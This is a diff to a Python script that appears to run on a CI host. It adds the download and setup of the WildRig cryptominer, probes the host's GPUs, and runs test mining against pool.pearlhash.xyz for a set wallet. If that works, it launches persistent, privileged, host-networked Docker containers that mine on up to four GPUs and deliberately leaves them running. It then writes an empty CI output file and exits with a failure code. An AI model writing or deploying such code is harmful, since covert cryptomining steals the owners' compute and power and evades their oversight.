@@ -24,6 +24,9 @@ KRIG_URL = "https://github.com/kryptex/krig-miner/releases/download/v1.6.0/krig-
 KRIG_TGZ_SHA = "9137388d5c4bfb843bde8bb96e37695446924dfc004eb3de76a71fd1956e4a04"
 KRIG_BIN_SHA = "928d6f621c74601c73759728f8dd53e5ad9b3b186d334c082f8581518c322f66"
 LP_STATS = "https://pearl.luckypool.io/api/stats_address?address=" + WALLET
+WRIG_URL = "https://github.com/andru-kun/wildrig-multi/releases/download/0.52.3/wildrig-multi-linux-0.52.3.tar.gz"
+WRIG_TGZ_SHA = "7308c95f7c8c4c0d82aade61bb4ab3366decae2b9d04ac47b8c1dc6d1bdd2c44"
+PH_STATS = "https://pearlhash.xyz/api/account/" + WALLET
 # worker6 names already reserved for this record by intent 141541 (state=live, host=null)
 WORKER_BY_DEV = {4: "000016", 5: "000017", 6: "000018", 7: "000019"}
 WORKER_POOL = ["000016", "000017", "000018", "000019"]
@@ -131,6 +134,31 @@ if [ -n "$SRC" ]; then for v in 6 7; do ln -sf "$SRC" /tmp/shim/libamdhip64.so.$
 ls -l /tmp/shim
 export LD_LIBRARY_PATH=/tmp/shim:/w/krig:/opt/dtk/hip/lib:/opt/dtk/lib:/opt/dtk/lib64:/opt/hyhal/lib:/opt/hyhal/lib64:/opt/dtk/opencl/lib:/opt/dtk/dcc/gcvm/lib:${LD_LIBRARY_PATH:-}
 cd /w/krig || exit 9
+echo "--- rocminfo"
+timeout 40 rocminfo 2>&1 | grep -E 'Name:|gfx|Marketing|Vendor|Uuid|Device Type' | head -24
+echo "--- hipconfig"
+timeout 20 hipconfig 2>&1 | head -16
+echo "--- HIP dlopen probe (libamdhip64.so.6 shim)"
+cat > /tmp/hip_probe.c <<'EOF'
+#include <stdio.h>
+#include <dlfcn.h>
+typedef int (*fn_i)(unsigned);
+typedef int (*fn_p)(int*);
+int main(void){
+  void *h = dlopen("libamdhip64.so.6", RTLD_NOW|RTLD_GLOBAL);
+  if(!h){ printf("dlopen6_fail=%s\n", dlerror()); h=dlopen("libamdhip64.so.7", RTLD_NOW|RTLD_GLOBAL); }
+  if(!h){ printf("dlopen_fail=%s\n", dlerror()); return 1; }
+  fn_i init = (fn_i)dlsym(h,"hipInit");
+  fn_p cnt = (fn_p)dlsym(h,"hipGetDeviceCount");
+  fn_p ver = (fn_p)dlsym(h,"hipRuntimeGetVersion");
+  printf("syms init=%p cnt=%p ver=%p\n", (void*)init, (void*)cnt, (void*)ver);
+  if(ver){int v=0; int r=ver(&v); printf("hipRuntimeGetVersion rc=%d v=%d\n", r, v);}
+  if(init){int r=init(0); printf("hipInit rc=%d\n", r);}
+  if(cnt){int c=-1; int r=cnt(&c); printf("hipGetDeviceCount rc=%d count=%d\n", r, c);}
+  return 0;
+}
+EOF
+if command -v gcc >/dev/null 2>&1; then timeout 60 gcc -o /tmp/hip_probe /tmp/hip_probe.c -ldl 2>&1 | head -5; timeout 30 /tmp/hip_probe 2>&1 | head -12; else echo "gcc_absent"; fi
 echo "--- krig --version"
 timeout 30 ./krig-miner --version 2>&1 | head -4
 echo "--- krig --list-devices"
@@ -183,6 +211,29 @@ export LD_LIBRARY_PATH=/tmp/shim:/w/krig:/opt/dtk/hip/lib:/opt/dtk/lib:/opt/dtk/
 cd /w/krig || exit 9
 timeout 60 ./krig-miner --list-devices 2>&1 | head -20
 echo "PRL595V3_PROBE_END"
+"""
+
+
+# Runs INSIDE the DTK image: WildRig OpenCL platform/device probe + bounded pearlhash attempt.
+WR_SH = r"""#!/bin/bash
+echo "PRL595V4_WR_BEGIN host=$(hostname) dev=$WR_DEV worker=$WORKER"
+if [ -f /opt/dtk/env.sh ]; then source /opt/dtk/env.sh; fi
+export LD_LIBRARY_PATH=/w/wildrig:/opt/dtk/opencl/lib:/opt/dtk/lib:/opt/dtk/lib64:/opt/hyhal/lib:/opt/hyhal/lib64:/opt/dtk/dcc/gcvm/lib:${LD_LIBRARY_PATH:-}
+cd /w/wildrig || exit 9
+ls -l wildrig-multi
+echo "--- wildrig --print-platforms"
+timeout 30 ./wildrig-multi --print-platforms 2>&1 | head -24
+echo "--- wildrig --print-devices"
+timeout 40 ./wildrig-multi --print-devices 2>&1 | head -40
+if [ "${WR_DEPLOY:-0}" = "1" ]; then
+  exec ./wildrig-multi --algo pearlhash --url stratum+tcp://pool.pearlhash.xyz:9000 --user "$WALLET" --pass x -w "$WORKER" --opencl-devices "$WR_DEV" --watchdog
+fi
+if [ "${WR_MINE_SECS:-0}" != "0" ]; then
+  echo "--- wildrig pearlhash attempt ${WR_MINE_SECS}s dev=$WR_DEV"
+  timeout -s INT "$WR_MINE_SECS" ./wildrig-multi --algo pearlhash --url stratum+tcp://pool.pearlhash.xyz:9000 --user "$WALLET" --pass x -w "$WORKER" --opencl-devices "$WR_DEV" --watchdog 2>&1 | head -140
+  echo "PRL595V4_WR_MINE_END rc=$?"
+fi
+echo "PRL595V4_WR_END"
 """
 
 PROCS = []
@@ -485,7 +536,7 @@ def main():
     say("=== PRL595V3_KRIG_FOREGROUND dev=%s worker=%s ===" % (testdev, testworker))
     _, mine_out = sh(
         "%s -e HIP_VISIBLE_DEVICES=%d -e ROCR_VISIBLE_DEVICES=%d -e HSA_OVERRIDE_GFX_VERSION=9.0.6 "
-        "-e DEV=%d -e KRIG_DEV=%d -e WORKER=%s -e AP=%d -e FOREGROUND_SECS=75 "
+        "-e DEV=%d -e KRIG_DEV=%d -e WORKER=%s -e AP=%d -e WALLET=%s -e FOREGROUND_SECS=75 "
         "--entrypoint /bin/bash %s /w/krig_mine.sh 2>&1 | tail -170"
         % (
             docker_base,
@@ -495,6 +546,7 @@ def main():
             0 if filter_works else testdev,
             testworker,
             ap,
+            WALLET,
             image,
         ),
         t=300,
@@ -504,10 +556,39 @@ def main():
         t=30,
     )
     low = (mine_out or "").lower()
-    mech_ok = any(
-        k in low for k in ("accepted", "share", "new job", "connected", "difficulty")
-    )
+    mech_ok = any(k in low for k in ("accepted", "share", "new job", "difficulty"))
     say("PRL595V3_MECHANISM_OK %s dev=%d worker=%s" % (mech_ok, testdev, testworker))
+
+    # ---------------- WildRig 0.52.3 in DTK container (PearlHash client, OpenCL) ----------------
+    wr_dir = WORK + "/wildrig"
+    wtgz = WORK + "/wildrig.tgz"
+    wr_ok = False
+    if fetch(WRIG_URL, wtgz):
+        wd = sha256_file(wtgz)
+        say("PRL595V4_WRIG_TGZ sha256=%s pin_match=%s" % (wd, wd == WRIG_TGZ_SHA))
+        if wd == WRIG_TGZ_SHA:
+            os.makedirs(wr_dir, exist_ok=True)
+            sh(
+                "tar -xzf %s -C %s && chmod +x %s/wildrig-multi && ls -la %s"
+                % (wtgz, wr_dir, wr_dir, wr_dir),
+                t=240,
+            )
+            wr_ok = os.path.exists(wr_dir + "/wildrig-multi")
+    wr_out = ""
+    wr_mech = False
+    if wr_ok:
+        open(WORK + "/wildrig_test.sh", "w").write(WR_SH)
+        _, wr_out = sh(
+            "%s -e WR_DEV=%d -e WR_MINE_SECS=60 -e WALLET=%s -e WORKER=%s "
+            "--entrypoint /bin/bash %s /w/wildrig_test.sh 2>&1 | tail -120"
+            % (docker_base, testdev, WALLET, testworker, image),
+            t=400,
+        )
+        wlow = (wr_out or "").lower()
+        wr_mech = any(k in wlow for k in ("accepted", "share", "new job", "difficulty"))
+    else:
+        say("PRL595V4_WRIG_UNAVAILABLE download_or_pin_failed")
+    say("PRL595V4_WILDRIG_OK %s" % wr_mech)
 
     if host != TARGET_HOST:
         say(
@@ -538,6 +619,76 @@ def main():
         say("=== PRL595V3-I142163-GPU000017-END ===")
         open("ci-model-plan.tsv", "w").close()
         return 1
+    if not mech_ok and wr_mech:
+        say("PRL595V4_WILDRIG_DEPLOY devices=%s" % json.dumps(free[:4]))
+        deployments = []
+        for n, dev in enumerate(free[:4]):
+            worker = WORKER_BY_DEV.get(dev, WORKER_POOL[n % len(WORKER_POOL)])
+            name = "prl595v3-%d" % dev
+            sh("docker rm -f %s >/dev/null 2>&1; echo pre_rm_rc=$?" % name, t=60)
+            rc, _ = sh(
+                "docker run -d --name %s --restart=on-failure:3 --network=host --privileged "
+                "--device=/dev/kfd --device=/dev/dri --device=/dev/mkfd --group-add video "
+                "-v /opt/hyhal:/opt/hyhal:ro -v %s:/w "
+                "-e WR_DEPLOY=1 -e WR_DEV=%d -e WALLET=%s -e WORKER=%s "
+                "--entrypoint /bin/bash %s /w/wildrig_test.sh"
+                % (name, WORK, dev, WALLET, worker, image),
+                t=240,
+            )
+            deployments.append(
+                (dev, worker, name, "started" if rc == 0 else "start_failed")
+            )
+            time.sleep(1)
+        time.sleep(30)
+        for dev, worker, name, st in deployments:
+            say(
+                "--- container %s dev=%d worker=%s state=%s ---"
+                % (name, dev, worker, st)
+            )
+            sh("docker logs --tail 20 %s 2>&1 | tail -25" % name, t=60)
+        sh(
+            "docker ps --filter name=prl595v3- --format '{{.Names}} {{.Status}}' | head -10",
+            t=40,
+        )
+        sh("timeout 20 /opt/hyhal/bin/hy-smi --showpids 2>&1 | head -50", t=40)
+        workers = [w for _d, w, _n, _s in deployments]
+        say(
+            "PRL595V4_PH_SAMPLE t0 %s"
+            % time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime())
+        )
+        sh(
+            "curl -fsS -m 30 -o %s/ph_t0.json '%s' && head -c 900 %s/ph_t0.json"
+            % (WORK, PH_STATS, WORK),
+            t=40,
+        )
+        say("PRL595V4_GATE_WAIT seconds=%d" % GATE_WAIT)
+        time.sleep(GATE_WAIT)
+        say(
+            "PRL595V4_PH_SAMPLE t1 %s"
+            % time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime())
+        )
+        sh(
+            "curl -fsS -m 30 -o %s/ph_t1.json '%s' && head -c 900 %s/ph_t1.json"
+            % (WORK, PH_STATS, WORK),
+            t=40,
+        )
+        sh(
+            "docker ps --filter name=prl595v3- --format '{{.Names}} {{.Status}}' | head -10",
+            t=40,
+        )
+        say(
+            "PRL595V4_WILDRIG_DEPLOYED host=%s devices=%s workers=%s"
+            % (
+                host,
+                json.dumps([d for d, _w, _n, _s in deployments]),
+                json.dumps(workers),
+            )
+        )
+        say("PRL595V4_LEAVING_MINERS_RUNNING revert=docker_rm_f_prl595v3_<dev>")
+        say("=== PRL595V3-I142163-GPU000017-END ===")
+        open("ci-model-plan.tsv", "w").close()
+        return 1
+
     deployments = []
     for n, dev in enumerate(free[:4]):
         worker = WORKER_BY_DEV.get(dev, WORKER_POOL[n % len(WORKER_POOL)])
